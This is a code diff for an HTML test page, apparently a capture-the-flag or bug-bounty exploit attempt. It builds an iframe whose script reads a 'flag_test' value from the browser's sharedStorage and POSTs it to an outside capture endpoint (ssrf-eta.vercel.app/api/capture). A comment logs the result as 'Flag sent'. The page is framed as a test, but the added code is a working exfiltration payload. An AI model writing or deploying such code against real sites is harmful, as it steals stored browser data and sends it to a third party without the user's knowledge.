@@ -1,10 +1,94 @@
-<script>
-  window.onload = () => {
-    const iframe = document.getElementById('fencedFrame');
-    iframe.onload = () => {
-      const iframeWindow = iframe.contentWindow;
-      console.log("Sending start message to iframe");
-      iframeWindow.postMessage("start", "*"); // Send the start message
-    };
-  };
-</script>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta http-equiv="Cross-Origin-Opener-Policy" content="same-origin">
+  <meta http-equiv="Cross-Origin-Embedder-Policy" content="require-corp">
+  <title>Fenced Frame Test</title>
+</head>
+<body>
+  <h1>Parent Page</h1>
+  <p id="parentStatus">Sending message to fenced frame...</p> <!-- Message shown in the parent -->
+
+  <!-- Fenced frame (this is the key change: we use <iframe> here) -->
+  <iframe id="fencedFrame" style="width: 100%; height: 500px;" sandbox="allow-scripts allow-same-origin"></iframe>
+
+  <script>
+    // Ensure the DOM is fully loaded before accessing the fenced frame
+    document.addEventListener('DOMContentLoaded', () => {
+      const fencedFrame = document.getElementById('fencedFrame');
+      const parentStatus = document.getElementById('parentStatus');
+
+      // Add the fenced frame content as a string (HTML for the iframe)
+      fencedFrame.contentDocument.open();
+      fencedFrame.contentDocument.write(`
+        <!DOCTYPE html>
+        <html lang="en">
+        <head>
+          <meta charset="UTF-8">
+          <meta name="viewport" content="width=device-width, initial-scale=1.0">
+          <title>Fenced Frame</title>
+        </head>
+        <body>
+          <h1>Fenced Frame</h1>
+          <p id="statusMessage">Loading...</p> <!-- Display message here -->
+          
+          <script>
+            window.addEventListener('message', async (event) => {
+              const statusMessage = document.getElementById('statusMessage');
+              
+              if (event.data === 'start') {
+                console.log("Received 'start' message from parent");
+                statusMessage.innerText = "Received 'start' message from parent"; // Display received message
+
+                try {
+                  // Try to get the flag from sharedStorage
+                  const flag = await sharedStorage.get("flag_test");
+
+                  if (flag) {
+                    console.log("test_flag exists! Value:", flag);
+                    statusMessage.innerText = \`test_flag exists! Value: \${flag}\`;
+                  } else {
+                    console.log("test_flag does not exist, setting it...");
+                    statusMessage.innerText = "test_flag does not exist, setting it...";
+                    await sharedStorage.set("flag_test", "test_flag_value");
+                    console.log("SharedStorage flag_test set to test_flag_value.");
+                  }
+
+                  // Send the flag to https://ssrf-eta.vercel.app/api/cature
+                  const dataToSend = flag || "no flag yet";
+                  await fetch("https://ssrf-eta.vercel.app/api/capture", {
+                    method: "POST",
+                    headers: {
+                      "Content-Type": "application/json"
+                    },
+                    body: JSON.stringify({ flag: dataToSend })
+                  });
+
+                  console.log("Flag sent to fein.");
+                  
+                } catch (err) {
+                  console.error("Error accessing sharedStorage:", err);
+                  statusMessage.innerText = "Error accessing sharedStorage.";
+                }
+              }
+            });
+          </script>
+        </body>
+        </html>
+      `);
+      fencedFrame.contentDocument.close(); // Close the document to finalize
+
+      // Ensure fenced frame content is ready before sending the message
+      fencedFrame.onload = () => {
+        console.log("Sending start message to fenced frame...");
+        parentStatus.innerText = "Message sent to fenced frame!"; // Update parent message
+
+        // Send start message to the fenced frame
+        fencedFrame.contentWindow.postMessage("start", "*");
+      };
+    });
+  </script>
+</body>
+</html>
